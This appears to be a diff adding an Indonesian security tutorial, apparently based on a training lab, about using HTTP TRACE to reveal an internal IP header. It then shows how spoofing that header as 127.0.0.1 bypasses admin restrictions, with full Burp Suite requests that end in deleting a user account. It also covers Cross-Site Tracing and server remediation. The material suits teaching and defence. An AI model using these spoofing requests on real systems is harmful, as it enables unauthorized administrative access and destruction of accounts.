@@ -1,0 +1,205 @@
+# Broken Access Control: Debugging Flow Menggunakan HTTP TRACE
+
+Salah satu teknik lanjutan dalam pengujian _Broken Access Control_ adalah memanfaatkan fungsionalitas diagnostik jaringan seperti **HTTP TRACE** untuk mengungkap arsitektur internal server dan menerobos pembatasan hak akses administratif.
+
+Metode HTTP TRACE dirancang untuk kebutuhan _debugging_ (pengujian _loopback_), di mana server akan **memantulkan kembali request yang diterimanya secara persis** kepada klien. Ketika server berada di balik _Reverse Proxy_, _Load Balancer_, atau _WAF_, metode ini dapat membocorkan header internal rahasia yang digunakan sistem untuk mengontrol otorisasi akses.
+
+---
+
+## 1. Konsep Kerentanan: Mengapa HTTP TRACE Membocorkan Header Internal?
+
+Dalam infrastruktur web modern, pengguna tidak langsung terhubung ke server aplikasi backend, melainkan melewati lapisan perantara (_Reverse Proxy_ seperti Nginx, Cloudflare, AWS ALB, atau Varnish).
+
+```
+[Klien / Penyerang] ──(1. Request Asli)──▶ [Reverse Proxy] ──(2. Request + Header Internal)──▶ [Server Backend]
+```
+
+Ketika _Reverse Proxy_ meneruskan request ke backend, proxy sering kali menambahkan **custom header** internal untuk menginformasikan identitas asli klien, contohnya:
+- `X-Custom-IP-Authorization: 105.12.90.11`
+- `X-Forwarded-For: 105.12.90.11`
+- `X-Client-IP: 105.12.90.11`
+- `X-Internal-Token: secret-cluster-token`
+
+### Bahaya Membiarkan HTTP TRACE Aktif
+Jika penyerang mengirimkan request `TRACE /`:
+1. Server backend menerima request dari proxy beserta header-header internal yang disisipkan.
+2. Server backend memantulkan kembali seluruh request tersebut ke dalam response body berformat `message/http`.
+3. **Penyerang dapat melihat nama dan struktur header internal** yang seharusnya dirahasiakan!
+
+---
+
+## 2. Alur Eksploitasi: Header Discovery & Access Control Bypass
+
+![HTTP TRACE Debugging Flow](/images/http-trace-diagram.svg)
+
+---
+
+## 3. Menghubungkan HTTP TRACE dengan Broken Access Control
+
+Banyak aplikasi membatasi panel admin (`/admin`) dengan aturan:
+> *"Panel Admin hanya dapat diakses oleh pengguna dari jaringan internal / localhost (`127.0.0.1`)."*
+
+Namun, backend sering kali menentukan apakah sebuah request berasal dari localhost hanya dengan membaca **custom header** (misalnya `X-Custom-IP-Authorization`).
+
+Jika penyerang berhasil mengetahui nama header tersebut melalui HTTP TRACE, penyerang dapat memalsukan (*spoofing*) header tersebut di Burp Suite:
+
+```http
+GET /admin HTTP/1.1
+Host: target-website.com
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
+Backend akan mengira request tersebut berasal dari administrator internal lokal dan langsung memberikan hak akses penuh!
+
+---
+
+## 4. Praktik Langkah Demi Langkah Menggunakan Burp Suite
+
+Berikut adalah panduan praktis membongkar kontrol akses menggunakan metode HTTP TRACE:
+
+---
+
+### Langkah 1: Uji Ketersediaan Metode HTTP TRACE
+1. Buka **Burp Suite** dan jalankan browser bawaan.
+2. Akses website target dan tangkap salah satu request `GET /` di tab **Proxy** > **HTTP history**.
+3. Kirim request tersebut ke **Burp Repeater** (`Ctrl + R` / `Cmd + R`).
+4. Ubah method `GET` menjadi `TRACE`:
+
+```http
+TRACE / HTTP/1.1
+Host: target-website.com
+User-Agent: Mozilla/5.0 ...
+```
+
+5. Klik tombol **Send**.
+
+---
+
+### Langkah 2: Analisis Response & Identifikasi Header Internal
+1. Periksa bagian panel **Response**.
+2. Jika server merespons dengan `200 OK` dan header `Content-Type: message/http`, cari baris-baris header baru yang tidak kamu kirimkan di request awal:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: message/http
+Content-Length: 182
+
+TRACE / HTTP/1.1
+Host: target-website.com
+User-Agent: Mozilla/5.0 ...
+X-Custom-IP-Authorization: 114.122.45.10
+```
+
+3. Perhatikan header **`X-Custom-IP-Authorization`**! Ini adalah parameter yang disisipkan oleh proxy untuk memvalidasi alamat IP klien.
+
+---
+
+### Langkah 3: Uji Endpoint Admin yang Terblokir
+1. Buka tab baru di Repeater dan kirim request ke endpoint administratif target:
+
+```http
+GET /admin HTTP/1.1
+Host: target-website.com
+```
+
+2. Server akan menolak akses dengan respons:
+```http
+HTTP/1.1 403 Forbidden
+
+Admin interface is only available to local users.
+```
+
+---
+
+### Langkah 4: Sisipkan Header Spoofing (Bypass Otorisasi)
+1. Tambahkan header hasil temuan TRACE dengan nilai IP localhost (`127.0.0.1`):
+
+```http
+GET /admin HTTP/1.1
+Host: target-website.com
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
+2. Klik tombol **Send**.
+3. Server kini merespons dengan **`200 OK`**, menampilkan dashboard panel administrator lengkap dengan fungsi manajemen pengguna!
+
+---
+
+### Langkah 5: Eksekusi Aksi Administratif
+1. Lakukan aksi berbahaya yang ditargetkan (misalnya menghapus akun `carlos`):
+
+```http
+GET /admin/delete?username=carlos HTTP/1.1
+Host: target-website.com
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
+2. Target berhasil dihapus dan skenario pengujian sukses! 🎉
+
+---
+
+## 5. Ancaman Terkait: Cross-Site Tracing (XST)
+
+Selain memfasilitasi _Access Control Bypass_, metode HTTP TRACE juga dapat dimanfaatkan untuk serangan **Cross-Site Tracing (XST)**.
+
+Secara default, atribut cookie `HttpOnly` melindungi token sesi agar tidak bisa dibaca oleh skrip JavaScript (XSS). Namun, jika HTTP TRACE aktif:
+1. Skrip XSS jahat mengirimkan request `TRACE /` menggunakan `XMLHttpRequest` atau `fetch`.
+2. Server memantulkan kembali seluruh header HTTP, termasuk cookie `HttpOnly` ke dalam response body teks biasa.
+3. Skrip JavaScript dapat membaca isi response body dan mencuri cookie sesi administrator yang seharusnya terlindungi!
+
+---
+
+## 6. Remediasi & Konfigurasi Server yang Aman
+
+### 1. Nonaktifkan Metode HTTP TRACE di Server Produksi
+
+#### Apache HTTP Server (`httpd.conf` / `.htaccess`)
+Tambahkan direktif global untuk mematikan TRACE:
+```apache
+TraceEnable Off
+```
+
+#### Nginx Configuration (`nginx.conf`)
+Tolak semua request dengan method TRACE atau batasi hanya pada method standar:
+```nginx
+server {
+    listen 80;
+    server_name example.com;
+
+    # Tolak method TRACE, TRACK, atau method non-standar lainnya
+    if ($request_method ~ ^(TRACE|TRACK)$) {
+        return 405;
+    }
+}
+```
+
+---
+
+### 2. Jangan Mengandalkan Header Klien untuk Otorisasi Jaringan
+Jangan pernah mempercayai header seperti `X-Forwarded-For` atau `X-Custom-IP-Authorization` yang dapat dimanipulasi klien jika _Reverse Proxy_ tidak dikonfigurasi untuk menimpa (_overwrite_) header tersebut secara ketat:
+
+```typescript
+// ❌ KODE RENTAN: Mempercayai header mentah dari request
+app.get("/admin", (req, res) => {
+  const clientIP = req.headers["x-custom-ip-authorization"];
+  if (clientIP === "127.0.0.1") {
+    return res.render("admin-dashboard");
+  }
+  return res.status(403).send("Akses ditolak.");
+});
+
+// ✅ KODE AMAN: Gunakan otentikasi sesi & role berbasis database (RBAC)
+app.get("/admin", authenticateUser, requireAdminRole, (req, res) => {
+  return res.render("admin-dashboard");
+});
+```
+
+---
+
+### 3. Konfigurasi Trusted Proxy pada Framework
+Pastikan framework (Express, Fastify, Spring, Laravel) hanya menerima header IP dari proxy lokal yang terpercaya:
+
+```typescript
+// Express.js
+app.set("trust proxy", "loopback"); // Hanya percaya proxy di 127.0.0.1 / localhost
+```
